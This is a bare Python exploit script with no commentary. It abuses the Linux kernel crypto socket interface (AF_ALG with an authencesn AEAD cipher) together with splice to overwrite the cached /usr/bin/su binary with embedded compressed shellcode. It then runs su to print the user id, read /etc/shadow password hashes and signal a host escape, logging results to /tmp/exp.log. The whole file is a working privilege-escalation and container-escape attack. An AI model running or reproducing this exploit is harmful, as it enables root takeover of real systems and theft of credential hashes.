#!/usr/bin/env python3
import os,zlib,socket,struct,subprocess,sys
def d(x):return bytes.fromhex(x)
def c(f,t,ch):
    a=socket.socket(38,5,0)
    a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
    h=279
    a.setsockopt(h,1,d('0800010000000010'+'0'*64))
    a.setsockopt(h,5,None,4)
    u,_=a.accept()
    o=t+4
    i=d('00')
    u.sendmsg([b'A'*4+ch],[(h,3,i*4),(h,2,bytes([16])+i*19),(h,4,bytes([8])+i*3)],32768)
    r,w=os.pipe()
    os.splice(f,w,o,offset_src=0)
    os.splice(r,u.fileno(),o)
    try:u.recv(8+t)
    except:pass
    a.close();u.close();os.close(r);os.close(w)
log=open("/tmp/exp.log","w")
log.write("START\n");log.flush()
try:
    f=os.open("/usr/bin/su",0)
    e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
    log.write("SC=%d\n"%len(e));log.flush()
    i=0
    while i<len(e):
        c(f,i,e[i:i+4]);i+=4
    os.close(f)
    log.write("PATCHED\n");log.flush()
    r=subprocess.run(["/usr/bin/su","-c","id;cat /etc/shadow|head -3;echo HOST_ESCAPE"],capture_output=True,text=True,timeout=10,stdin=subprocess.DEVNULL)
    log.write("OUT:"+r.stdout+"\n")
    log.write("ERR:"+r.stderr+"\n")
    log.write("RC:%d\n"%r.returncode)
except Exception as ex:
    log.write("FAIL:"+str(ex)+"\n")
    import traceback;log.write(traceback.format_exc())
log.close()
print("done")
